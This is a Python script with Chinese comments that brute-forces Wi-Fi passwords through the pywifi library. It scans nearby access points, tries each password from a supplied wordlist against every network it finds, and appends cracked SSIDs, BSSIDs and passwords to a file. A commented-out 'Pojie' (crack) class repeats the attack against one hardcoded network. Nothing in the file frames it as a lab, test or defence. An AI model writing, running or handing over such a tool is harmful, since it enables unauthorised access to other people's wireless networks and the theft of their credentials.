
import time
import sys


# 导入wifi模块
import pywifi


# 引用一些定义
from pywifi import const
from asyncio.tasks import sleep

def scans(face, timeout):
    # 开始扫描
    face.scan()
    time.sleep(timeout)
    # 在若干秒后获取扫描结果
    return face.scan_results()

def test(i, face, x, key, stu, ts):
    showID = x.bssid if len(x.ssid)>len(x.bssid) else x.ssid
    for n,k in enumerate(key):
        x.key = k.strip()
        # 移除所有热点配置
        face.remove_all_network_profile(x)
        # 将封装好的目标尝试连接
        face.connect(face.add_network_profile(x))
        # 初始化状态码，考虑到用0会发生些系统错误
        code = 10
        t1 =time.time()
        # 循环刷新状态，如果置为0，则密码错误，如果超时，则进行下一个
        while code != 0:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            if now > ts :
                break
            stu.write('\r%-*s|%-*s|%s|%*.2fs|%-*s|%-*s%*s'%(6,i,18,showID,code,5,now,7,x.signal,10,len(key)-n,10,k.replace("\n","")))
            stu.flush()
            if code ==4 :
                face.disconnect()
                return "%-*s|%s|%*s|%*s\n"%(20,x.ssid,x.bssid,3,x.signal,15,k)
    return False

def main():
    # 扫描
    scantimes = 3
    testtimes = 15
    output = sys.stdout
    files = 'csdwifi.txt'
    keys = open(sys.argv[1], 'r').readlines()
    # 实例化一个pywifi对象
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    # 扫面并获取周围热点基础配置
    scanres = scans(iface,scantimes)
    # 统计附近扫描到的热点数量
    nums = len(scanres)

    for i,x in enumerate(scanres):
        # 测试完毕后，成功的信息，存储到文件中
        res = test(nums-i,iface,x,keys,output,testtimes)
        if res:
            open(files,'a').write(res)

if __name__ == '__main__':
    main()




# class Pojie():
#     def __init__(self, path):
#         self.file = open(path, 'r', errors='ignore')
#         wifi = pywifi.PyWiFi()  # 抓取网卡接口
#         self.iface = wifi.interfaces()[0]  # 抓取第一个无线网卡
#         self.iface.disconnect()  # 测试链接断开所有链接
#
#         time.sleep(1)
#
#         # 测试网卡是否属于断开状态
#         assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
#
#     def readPwd(self):
#         print("开始破解")
#         while True:
#             try:
#                 myStr = self.file.readline()
#                 if not myStr:
#                     break
#                 bool1 = self.test_connect(myStr)
#                 if bool1:
#                     print('密码正确'+myStr)
#                 else:
#                     print("密码错误"+myStr)
#                 time.sleep(3)
#             except:
#                 continue
#     def test_connect(self, findStr):
#         # 创建wifi链接文件
#         profile = pywifi.Profile()
#         # wifi名字
#         profile.ssid = "DanceArt"
#         profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
#         profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
#         profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
#         profile.key = findStr  # 密码
#
#         self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
#         tem_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
#         self.iface.connect(tem_profile)  # 链接
#         time.sleep(5)
#         if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
#             isOK = True
#         else:
#             isOK = False
#         self.iface.disconnect()  # 断开
#         time.sleep(1)
#         #  检查断开状态
#         assert self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
#         return isOK
#     def __del__(self):
#         self.file.close()
# path = r"csdwifi.txt"
# start = Pojie(path)
# if __name__ == '__main__':
#     start.readPwd()